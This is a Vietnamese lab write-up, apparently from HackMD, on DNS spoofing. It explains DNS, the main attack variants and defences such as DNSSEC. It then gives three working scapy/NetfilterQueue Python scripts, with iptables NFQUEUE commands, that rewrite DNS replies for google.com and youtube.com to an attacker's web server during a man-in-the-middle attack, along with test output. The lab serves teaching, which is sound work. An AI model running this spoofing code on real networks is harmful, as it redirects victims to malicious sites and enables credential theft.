# DNS Spoofing

sau khi các gói tin trên mạng từ victim phải chuyển qua cho attack để lưu thông trên mạng, chúng ta đã thực hiện được MITM ở bài Lab trước <a href="https://hackmd.io/@monstercuong7/r1R_91mC6">tại đây</a>

- chúng ta sẽ tìm hiểu cách sửa đổi các packets đó để khi victim vào các trang web phổ biến sẽ redirect đến trang web chứa mã độc của chúng ta, chúng ta sẽ thấy một trong những phương pháp thú vị đó là DNS spoofing

## Khái niệm & Khai thác & Phòng tránh

### Khái niệm

- DNS: Domain Name System server dịch tên miền mà con người có thể đọc được (chẳng hạn như google.com ) thành địa chỉ IP được sử dụng để tạo kết nối giữa máy chủ và máy khách, chẳng hạn, nếu người dùng muốn kết nối với google.com thì máy của người dùng sẽ tự động gửi request tới DNS server, nói rằng mình muốn địa chỉ IP của google.com như trong hình:
  ![image](https://hackmd.io/_uploads/rkGyOuLRa.png)

- DNS server lưu các ánh xạ địa chỉ IP

![image](https://hackmd.io/_uploads/SkQ9k6DRp.png)

- Domain name system server (DNS server) là một tập hợp của bốn loại server tạo ra DNS lookup process. Chúng bao gồm resolving name server, root name servers, top-level domain (TLD) name servers, và authoritative name servers. Để đơn giản, chúng ta sẽ chỉ tìm hiểu chi tiết về resolver server.
  - Resolver server (hoặc recursive resolver) là thành phần phiên dịch của DNS lookup process nằm trong hệ điều hành. Nó được thiết kế để hỏi. Tức là query – một loạt các DNS server cho địa chỉ target IP của một domain name.
- DNS Spoofing : Giả mạo DNS là một kiểu tấn công mạng máy tính, trong đó mục tiêu buộc phải điều hướng đến trang giả mạo bằng cách thay thế địa chỉ IP được gửi bởi máy chủ DNS. Mục tiêu này không biết rằng đó là một trang giả mạo. Động cơ của cuộc tấn công là đánh cắp dữ liệu của mục tiêu (tên người dùng, chi tiết thẻ tín dụng, mật khẩu, v.v.).

- Có hai mối đe dọa phổ biến nhất về DNS hiện nay như sau:
  - **DNS Spoofing** là loại tấn công hoạt động dựa vào các vị trí máy chủ gốc để di chuyển lưu lượng truy cập của miền. Điều này khiến cho người dùng nạn nhân không thể phát hiện ra bất cứ dấu hiệu bất thường nào về trang web mà họ đang truy cập mà chúng ta sẽ thực hiện khai thác trong bài này
  - **DNS Cache Poisoning** là loại tấn công hoạt động bằng cách giả mạo DNS. Trong đó, hệ thống người dùng sẽ ghi lại địa chỉ IP giả mạo trong bộ nhớ đệm cục bộ khiến cho DNS điều hướng đến một trang web độc hại. Là một phương pháp DNS spoofing phía user. Trong đó, hệ thống của bạn log địa chỉ IP giả trong local memory cache. Điều này dẫn đến việc DNS sẽ recall trang web xấu. Ngay cả khi sự cố đã được giải quyết hoặc chưa bao giờ tồn tại ở phía server.
- Ngoài hai loại tấn công DNS Cache Poisoning và DNS Spoofing còn có một số hình thức giả mạo như sau:
  - **DNS Server Hijack** là loại tấn công mà tin tặc trực tiếp cấu hình lại máy chủ để hướng người dùng nạn nhân đến trang web độc hại mà chúng tạo sẵn. Cụ thể, tất cả các yêu cầu IP được nhập vào miền giả mạo sẽ dẫn đến trang web độc hại.
  - **DNS Cache Poisoning** Via Spam là hình thức tấn công bộ nhớ cache DNS thông qua các email spam. Trong đó, nội dung của các email spam này bao gồm đường liên kết hoặc tệp đính kèm giả mạo. Nếu người dùng nhấp vào nó thì sẽ được điều hướng đến các trang web độc hại.

### Khai thác

![image](https://hackmd.io/_uploads/Hkm_uOLCT.png)

- Lưu ý: Để trở thành kẻ trung gian, bạn cần thực thi tập lệnh giả mạo ARP , do đó, nạn nhân sẽ gửi các yêu cầu DNS đến máy của bạn trước, thay vì định tuyến chúng trực tiếp vào Internet.

Bây giờ, vì kẻ tấn công đang ở giữa, nên hắn sẽ nhận được yêu cầu DNS cho biết "địa chỉ IP của google.com là gì", sau đó hắn sẽ chuyển tiếp yêu cầu đó đến máy chủ DNS như trong hình sau:

![image](https://hackmd.io/_uploads/rJJsO_UR6.png)

Máy chủ DNS nhận được yêu cầu hợp pháp, nó sẽ phản hồi bằng phản hồi DNS:

![image](https://hackmd.io/_uploads/B172_dLC6.png)

- Kẻ tấn công hiện đã nhận được phản hồi DNS có địa chỉ IP thực của google.com , điều hắn sẽ làm bây giờ là thay đổi địa chỉ IP này thành một IP giả độc hại (trong trường hợp này là máy chủ web của chính hắn là 192.168.1.100 hoặc 192.168.1.106 hay bất cứ cái gì ):

IP giả mạo phản hồi DNS

![image](https://hackmd.io/_uploads/rJZbF_806.png)

- Bằng cách này, khi người dùng gõ google.com trên trình duyệt, victim sẽ thấy trang giả mạo của kẻ tấn công mà không để ý!

- với mạng có dây chúng ta cũng làm tương tự khi đã thực hiện MITM thành thành công

![image](https://hackmd.io/_uploads/B1ELU0vCa.png)

#### Các phương pháp tấn công DNS Spoofing hoặc Cache Poisoning

Có nhiều phương pháp để tấn công DNS Spoof, sau đây là một số phương pháp phổ biến:

- **Man-in-the-middle duping**: Nơi kẻ tấn công nằm giữa web browser của bạn và DNS server để lây nhiễm cả hai. Một tool được sử dụng để tấn công cache poisoning đồng thời trên cả thiết bị local của bạn và server poisoning trên DNS server. Kết quả là chuyển hướng đến một trang web độc hại được host trên local server của chính kẻ tấn công.

- **DNS server hijack**: Tội phạm trực tiếp cấu hình lại server để hướng tất cả request của user đến trang web độc hại. Khi DNS entry giả được đưa vào DNS server, bất kỳ IP request nào cho spoofed domain sẽ dẫn đến trang web giả mạo.![image](https://hackmd.io/_uploads/H1vkkk_0p.png)
  đây là hình minh họa attaker truy cập và sửa đổi được cache trên dns server như wifirouter trong nhà chúng ta hay cache được lưu trên máy tính của victim ![image](https://hackmd.io/_uploads/B1iVl1O0T.png)
  attacker cũng có thể thực hiện tấn công bằng cách trỏ tên miền trên dịch vụ cung cấp tên miền của 1 trang web sang IP mà attacker host chứa nội dung độc hại có thể bằng kỹ nghệ xã hội hay brute force

- **DNS cache poisoning via spam**: Code của DNS cache poisoning thường được tìm thấy trong các URL được gửi qua email spam. Những email này cố gắng khiến user sợ hãi khi nhấp vào URL được cung cấp. Từ đó lây nhiễm vào máy tính của họ.

- Bên cạnh đó, quảng cáo biểu ngữ và hình ảnh cả trong email và các trang web không đáng tin cậy cũng có thể hướng user đến code này. Sau khi bị poisoned, máy tính của bạn sẽ đưa bạn đến các trang web giả được giả mạo để trông giống như thật. Đây là nơi các mối đe dọa thực sự sẽ xâm nhập vào thiết bị của bạn.

### Phòng tránh

- Đối với chủ sở hữu trang web và nhà cung cấp DNS server:

  - Thay thế DNS bằng DNSSEC:
    - DNSSEC là một giải pháp mới dùng để thay thế cho DNS. DNSSEC sử dụng các bản ghi DNS có chữ ký để đảm bảo sự hợp lệ hóa đáp trả truy vấn. DNSSEC được coi là “tương lai của DNS”.

- Đối với người dùng
  - Không nhấp vào các liên kết và tệp đính kèm đáng nhờ đến từ Email, SMS hay thông báo từ các ứng dụng khác. Hãy nhấn chọn URL theo cách thủ công để xác định rằng đó là liên kết an toàn.
  - Không bao giờ nhấp vào liên kết mà bạn không nhận ra
  - Thường xuyên scan máy tính để tìm phần mềm độc hại
  - Sử dụng virtual private network (VPN).

### DNS Spoofing Lab

- Kịch bản tấn công:

  - Triển khai giả mạo ARP trong mạng của mục tiêu để tất cả các gói sẽ được định tuyến qua thiết bị của attacker.
  - Tạo quy tắc chuỗi Iptable để đẩy các gói được định tuyến qua thiết bị tới Hàng đợi Netfilter.
  - Bước tiếp theo là xử lý các gói bằng tập lệnh
  - Các gói tin đã được xử lý sẽ được gửi đến nạn nhân.
  - Sau đó, nạn nhân sẽ nhận được địa chỉ IP giả từ phản hồi DNS.

- kiểm tra ip trên máy victim

![ảnh](https://hackmd.io/_uploads/SJrXpkDCT.png)

- kiểm tra ip trên máy attacker

![ảnh](https://hackmd.io/_uploads/BJHv61vA6.png)

xem bảng ARP mình được

![ảnh](https://hackmd.io/_uploads/By3Q1gvA6.png)

- vậy mình được ánh xạ địa chỉ mình dùng trong lab này là:

| Host                    | IP address       | MAC address         |
| ----------------------- | ---------------- | ------------------- |
| `Kali linux` (Attacker) | `192.176.45.101` | `34:6f:24:18:c9:2f` |
| `Window 7` (Victim)     | `192.176.45.102` | `0c:84:dc:f5:3c:79` |
| `Default Gateway`       | `192.176.45.1`   | `c0:61:18:e2:ef:72` |

kiểm tra firewal trên máy attacker bằng lệnh

```bash
iptables -L -v
```

mình thấy được không có rule nào được set

- vậy sau khi thiết lập rule bằng code python chúng ta có thể xóa toàn bộ bằng lệnh `iptables --flush`

![ảnh](https://hackmd.io/_uploads/ryG9pJvCp.png)

bậy giờ chúng ta sẽ xây dựng đoạn script để sửa đổi gói tin DNS khi các packets từ victim đến được card mạng của attacker và mình cần dùng:

- NetfilterQueue: NetfilterQueue là thư viện Python cung cấp quyền truy cập vào các gói khớp với quy tắc iptables trong Linux. Các gói phù hợp có thể được chấp nhận, loại bỏ, thay đổi hoặc đánh dấu.
- iptable (xem thêm về iptable <a href="https://wiki.matbao.net/kb/bao-mat-may-chu-linux-huong-dan-cau-hinh-iptables-can-ban/#2-tao-rule-iptables">tại đây</a>) có 3 chain:
  - **Forward chain** : lọc gói khi đi đến các server khác.
  - **Input chain** : lọc gói khi đi vào trong server.
  - **Output chain** : lọc gói khi ra khỏi server.

```python
from scapy.all import *
from netfilterqueue import NetfilterQueue
import os


def process_packet(packet):
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(DNSRR):
        print("[Before]:", scapy_packet.summary())
        try:
            scapy_packet = modify_packet(scapy_packet)
        except IndexError:
            # not UDP packet, this can be IPerror/UDPerror packets
            pass
        print("[After ]:", scapy_packet.summary())
        packet.set_payload(bytes(scapy_packet))
    packet.accept()

def modify_packet(scapy_packet):
    # scapy_packet[Raw].load = scapy_packet[Raw].load.replace(b'flag', b'Helo')

    qname = scapy_packet[DNSQR].qname
    if qname not in dns_hosts:
        # if the website isn't in our record
        # we don't wanna modify that
        print("no modification:", qname)
        return packet
    scapy_packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
    scapy_packet[DNS].ancount = 1
    del scapy_packet[IP].len
    del scapy_packet[IP].chksum
    del scapy_packet[UDP].len
    del scapy_packet[UDP].chksum
    return scapy_packet

if __name__=='__main__':
    dns_hosts = {
    b"www.google.com.": "192.176.45.101",
    b"google.com.": "192.176.45.101",
    b"youtube.com.": "192.176.45.101"
    }
    try:
        if os.geteuid() != 0:
            exit("Run with root permission!")
        os.system('iptables -A INPUT -i wlan0 -j NFQUEUE --queue-num 0')
        queue = NetfilterQueue()
        queue.bind(0, process_packet)
        queue.run()
    except KeyboardInterrupt:
        os.system("iptables --flush")
```

- đoạn code sẽ:
  - Định nghĩa hàm process_packet(packet), được sử dụng để xử lý các gói tin mạng đến.
  - Định nghĩa hàm modify_packet(scapy_packet) để sửa đổi gói tin DNS. Hàm này sẽ thay đổi các thông tin DNS trong gói tin DNS truy vấn để chuyển hướng yêu cầu DNS tới các máy chủ khác.
  - Tạo một từ điển dns_hosts để ánh xạ các tên miền DNS (cần chuyển hướng) tới địa chỉ IP mới.
  - Kiểm tra xem chương trình được chạy với quyền root hay không (cần quyền root để lắng nghe gói tin mạng).
  - Thêm một quy tắc iptables để chuyển tất cả các gói tin đến trên giao diện mạng wlan0 vào hàng đợi netfilter (NFQUEUE) với số hàng đợi là 0.
  - Liên kết một queue (NetfilterQueue) với số hàng đợi 0 và hàm process_packet để xử lý các gói tin trong hàng đợi.
  - Chạy vòng lặp chính để lắng nghe và xử lý các gói tin trong hàng đợi. Nếu có ngoại lệ KeyboardInterrupt, chương trình sẽ dọn dẹp bằng cách xóa tất cả các quy tắc iptables.

nhưng khi chạy nếu gặp phải các gói tin chứa các domain khác thì chúng ta sẽ bị crash chương trình còn các domain trong list mà chúng ta định nghĩa sẽ bị thay đổi địa chỉ ip

mình dùng đoạn code sau để khai thác dns spoofing trên máy victim mà chỉ khi gặp các gói tin trong list của chúng ta nó mới thay đổi

```python
from scapy.all import *
from netfilterqueue import NetfilterQueue
import os

# for example, google.com will be redirected to 192.176.45.101
dns_hosts = {
    b"www.google.com": "192.176.45.101",
    b"google.com.": "192.176.45.101",
    b"youtube.com.": "192.176.45.101"
}


def process_packet(packet):
    """
    Whenever a new packet is redirected to the netfilter queue,
    this callback is called.
    """
    # convert netfilter queue packet to scapy packet
    scapy_packet = IP(packet.get_payload())

    if scapy_packet.haslayer(DNSRR):
        # if the packet is a DNS Resource Record (DNS reply)
        # modify the packet
        print("=================================================")
        print("[Before]:", scapy_packet.summary())
        try:
            scapy_packet = modify_packet(scapy_packet)
        except IndexError:
            # not UDP packet, this can be IPerror/UDPerror packets
            pass
        print("[After ]:", scapy_packet.summary())
        # set back as netfilter queue packet
        packet.set_payload(bytes(scapy_packet))
    # accept the packet
    packet.accept()




def modify_packet(packet):
    """
    Modifies the DNS Resource Record `packet` ( the answer part)
    to map our globally defined `dns_hosts` dictionary.
    For instance, whenever we see a google.com answer, this function replaces
    """
    # get the DNS question name, the domain name
    qname = packet[DNSQR].qname
    if qname not in dns_hosts:
        # if the website isn't in our record
        # we don't wanna modify that
        print("no modification:", qname)
        return packet
    # craft new answer, overriding the original
    # setting the rdata for the IP we want to redirect (spoofed)
    # for instance, google.com will be mapped to "192.176.45.101"
    packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
    # set the answer count to 1
    packet[DNS].ancount = 1
    # delete checksums and length of packet, because we have modified the packet
    # new calculations are required ( scapy will do automatically )
    del packet[IP].len
    del packet[IP].chksum
    del packet[UDP].len
    del packet[UDP].chksum
    # return the modified packet
    return packet

QUEUE_NUM = 0
# insert the iptables FORWARD rule
os.system("iptables -A FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
# instantiate the netfilter queue
queue = NetfilterQueue()

try:
    # bind the queue number to our callback `process_packet`
    # and start it
    queue.bind(QUEUE_NUM, process_packet)
    queue.run()
except KeyboardInterrupt:
    # if want to exit, make sure we
    # remove that rule we just inserted, going back to normal.
    os.system("iptables --flush")
```

- mình tạo 1 trang html đơn giản

![ảnh](https://hackmd.io/_uploads/ryY9CQPC6.png)

- sau đó dùng module của python để tạo máy chủ web http chạy ở port 80 trên máy của attacker

```bash
python3 -m http.server  80
```

truy cập thử vào trên trình duyệt sẽ hiện trang html như sau với IP của attacker là 192.176.45.101

![ảnh](https://hackmd.io/_uploads/BkYPC7vCp.png)

chúng ta chạy file arpspoof.py để khai thác MITM như bài trước và chạy file dns_spoof.py để thay đổi domain từ các gói tin đó sau đó đợi victim truy cập vào trang google.com

- giờ mình đóng giả làm victim và ping thử đến google.com

![ảnh](https://hackmd.io/_uploads/S113i7D0a.png)

- không hiểu sao máy window 7 lại báo không thể tìm thấy domain google.com, mà móng muốn của chúng ta ở đây là nó sẽ ping được nhưng đến địa chỉ ip của attacker tạo 192.176.45.101
- nhưng khi ping đến dantri.com.vn vẫn bình thường

- theo dõi tại máy của attacker thấy các gói tin ping đã được sử lý trong code của chúng ta

![ảnh](https://hackmd.io/_uploads/ryF8i7PRa.png)

- với domain của google.com với IP 172.217.27.46 đã được sửa thành ip của máy attacker là 192.176.45.101
- các domain khác mà chúng ta không muốn sửa như dantri.com.vn thì vẫn như mình thường

- mình sửa câu lệnh trong iptables thành

```bash
iptables -A INPUT -j NFQUEUE --queue-num 0
```

để lọc các gói khi đi vào trong máy tính attacker và chúng ta sẽ khai thác trên máy local của attacker và được đoạn code sau:

```python
from scapy.all import *
from netfilterqueue import NetfilterQueue
import os

# for example, google.com will be redirected to 192.176.45.101
dns_hosts = {
    b"www.google.com": "192.176.45.101",
    b"google.com.": "192.176.45.101",
    b"youtube.com.": "192.176.45.101"
}


def process_packet(packet):
    """
    Whenever a new packet is redirected to the netfilter queue,
    this callback is called.
    """
    # convert netfilter queue packet to scapy packet
    scapy_packet = IP(packet.get_payload())

    if scapy_packet.haslayer(DNSRR):
        # if the packet is a DNS Resource Record (DNS reply)
        # modify the packet
        print("=================================================")
        print("[Before]:", scapy_packet.summary())
        try:
            scapy_packet = modify_packet(scapy_packet)
        except IndexError:
            # not UDP packet, this can be IPerror/UDPerror packets
            pass
        print("[After ]:", scapy_packet.summary())
        # set back as netfilter queue packet
        packet.set_payload(bytes(scapy_packet))
    # accept the packet
    packet.accept()




def modify_packet(packet):
    """
    Modifies the DNS Resource Record `packet` ( the answer part)
    to map our globally defined `dns_hosts` dictionary.
    For instance, whenever we see a google.com answer, this function replaces
    """
    # get the DNS question name, the domain name
    qname = packet[DNSQR].qname
    if qname not in dns_hosts:
        # if the website isn't in our record
        # we don't wanna modify that
        print("no modification:", qname)
        return packet
    # craft new answer, overriding the original
    # setting the rdata for the IP we want to redirect (spoofed)
    # for instance, google.com will be mapped to "192.168.1.100"
    packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
    # set the answer count to 1
    packet[DNS].ancount = 1
    # delete checksums and length of packet, because we have modified the packet
    # new calculations are required ( scapy will do automatically )
    del packet[IP].len
    del packet[IP].chksum
    del packet[UDP].len
    del packet[UDP].chksum
    # return the modified packet
    return packet

QUEUE_NUM = 0
# insert the iptables FORWARD rule
os.system("iptables -A INPUT -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
# instantiate the netfilter queue
queue = NetfilterQueue()

try:
    # bind the queue number to our callback `process_packet`
    # and start it
    queue.bind(QUEUE_NUM, process_packet)
    queue.run()
except KeyboardInterrupt:
    # if want to exit, make sure we
    # remove that rule we just inserted, going back to normal.
    os.system("iptables --flush")
```

- tiến hành chạy file dns_spoof.py và mình ping thử đến google.com và thấy địa chỉ của domain này đã được thay bằng địa chỉ ip của máy attacker tại 192.176.45.101
  - và chúng ta có thể thấy rõ hơn khi mình dùng nslookup để tìm tên miền của google.com

![ảnh](https://hackmd.io/_uploads/rJ1Rj2wAa.png)

- sau đó mình thử curl đến google.com và nhận được trang html của mình

![ảnh](https://hackmd.io/_uploads/rJeJRXDRa.png)

- vậy là mình khai thác dns spoofing thành công

  - tuy nhiên mình vào trình duyệt truy cập google.com thì nó lại không trả về trang html của mình

![ảnh](https://hackmd.io/_uploads/ByFIh2DAa.png)

- điều này có thể hiểu là bởi vì cơ chế lưu cache
  - khi chúng ta nhập google.com trình duyệt web sẽ đi tìm địa chỉ ip được lưu trong cache của máy tính mà mình đang dùng
  - nếu không có trong cache của máy tính nó sẽ tiếp tục gửi đến Resolver server (tương được với routerwifi mà chúng ta đang dùng tại IP 192.176.45.1) và nó sẽ kiểm tra bộ nhớ cache của chính nó để tìm IP cho tên miền chúng ta yêu cầu
  - và cứ như thế qua từng routerwifi đến cuối cùng nếu không có trong cache của model ra ngoài mạng nó sẽ tìm đến DNS server của google tại 8.8.8.8

![image](https://hackmd.io/_uploads/rk_FA2wCa.png)

các bạn có thể xem thêm <a href="https://www.youtube.com/watch?v=FBF-xXX7nVM">tại đây</a>.

- bởi vì cơ chế lưu cache đó địa chỉ IP của google.com đã được lưu trong cache của máy tính và trình duyệt không phải đi tìm trên mạng nên chúng ta không thể thay đổi gói tin DNS của victim
- vậy chúng ta cần đợi cache hết hạn hoặc dùng lệnh `ipconfig /flushdns` để xóa cache trên máy victim ở đây là Window 7
- và có thể chúng ta cần cấu hình nat cho firewall của attacker để máy victim có thể ping được đến nó như dự định của chúng ta
- các bạn có thể xem cách khai thác dns spooding với công cụ **ettercap** <a href="https://www.youtube.com/watch?v=g-XZpTxusS8&t=280s"> tại đây</a>

## Tham khảo

- https://wiki.matbao.net/kb/bao-mat-may-chu-linux-huong-dan-cau-hinh-iptables-can-ban/#2-tao-rule-iptables
- https://thepythoncode.com/article/make-dns-spoof-python#google_vignette
- https://www.geeksforgeeks.org/how-to-make-a-dns-spoof-attack-using-scapy-in-python/
- https://www.youtube.com/watch?v=g-XZpTxusS8&t=280s
- https://vietnix.vn/dns-cache-poisoning-va-dns-spoofing-la-gi/
